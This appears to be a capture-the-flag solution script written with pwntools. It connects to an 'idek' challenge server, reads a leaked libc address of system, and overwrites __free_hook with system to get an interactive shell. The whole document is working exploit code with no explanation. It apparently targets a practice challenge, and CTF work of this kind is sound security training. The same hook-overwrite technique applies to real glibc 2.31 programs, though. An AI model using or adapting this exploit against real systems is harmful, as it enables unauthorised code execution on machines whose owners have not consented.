from pwn import *

io = remote('cached.chal.idek.team', 1337)
libc = ELF('./libc-2.31.so')


io.send(b'\n')
io.send(b'\n')
io.send(b'\n')
io.send(b'\n')
print(io.recvuntil(b'system @ '))
fh = int(io.recvline().split()[0], 16) - libc.sym['system'] + libc.sym['__free_hook']
io.sendline(p64(fh))
io.sendline(p64(fh - libc.sym['__free_hook'] + libc.sym['system']))
io.interactive()
